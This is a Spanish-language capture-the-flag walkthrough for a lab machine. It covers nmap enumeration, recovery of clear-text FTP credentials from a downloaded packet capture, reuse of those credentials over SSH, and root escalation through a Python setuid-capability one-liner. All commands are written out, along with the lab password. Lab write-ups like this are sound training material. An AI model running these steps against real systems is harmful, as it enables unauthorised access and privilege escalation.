# Enumeracion
- Analizamos los puertos con nmap
```bash
sudo nmap -sS -p- -Pn -n --min-rate 5000 --open 10.10.10.245 -oG allPorts
```
```txt
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

- ahora hacemos un analisis de las versiones y ejecutamos algunos scripts de recolección de información
```bash
sudo nmap -sVC -p21,22,80 -n -Pn --min-rate 5000 10.10.10.245 -oN Targeted
```
```txt
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
```

- Vamos a enumerar información del servicio web
	- Tenemos un panel de busqueda que no parece ser vulnerable a sqli
		![[Pasted image 20241107204958.png]]
	- tenemos una pagina donde podemos descargar los ultimos 5 segundos de trafico en la web
		![[Pasted image 20241107205200.png]]
	- podemos ver el resultado de la ejecucion de un `ifconfig`
		![[Pasted image 20241107205257.png]]
	- podemos ver el resultado de un `netstat`
		![[Pasted image 20241107205315.png]]
	
- me llama la atención el archivo que podemos descargar ya que parece ser que nos permite ver analisis anteriores
	![[Pasted image 20241107205659.png]]
- vamos a intentar descargar el archivo `0` y lo abriremos con [[tcpdump]]
	![[Pasted image 20241107205744.png]] 
	```bash
	tcpdump -r 0.pcap -A
	```
	analizando los paquetes podemos ver que se capturo la tramitacion para una conexion via ftp por lo cual podemos ver los credenciales en texto claro
	![[Pasted image 20241107210308.png]]
	`nathan:Buck3tH4TF0RM3!`
# Explotacion
- Ahora que tenemos credenciales supuestamente validos para ftp vamos a intentar conectarnos a la ma
	```bash
	ftp nathan@10.10.10.245
	```
	![[Pasted image 20241107210457.png]]
- esto me hace pensar que puede que tambien sean credeciales validas para ssh, y asi es
	```bash
	ssh nathan@10.10.10.245
	```
	![[{14C03AD9-DF1D-4810-8B19-9F3B861EF1DE}.png]]
	hacemos un `export TERM=xterm` para poder hacer `ctrl+l` 
- Vamos a enumerar la maquina para ver posibles vias de privilege Escalation, y nos damos cuenta que el ejecutable de python tiene un capabilitie que nos permite cambiar nuestro UID por lo que usando python podemos cambiar nuestra UID y ejecutar un comando como ese usuario, (https://gtfobins.github.io/gtfobins/python/#capabilities)
	```bash
	getcap -r / 2>/dev/null
	```
	y ahora
	```bash
	python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
	```

- ya somos root
	![[{F1A7EA16-B2B7-4B0D-A500-249BDE5E683A}.png]]
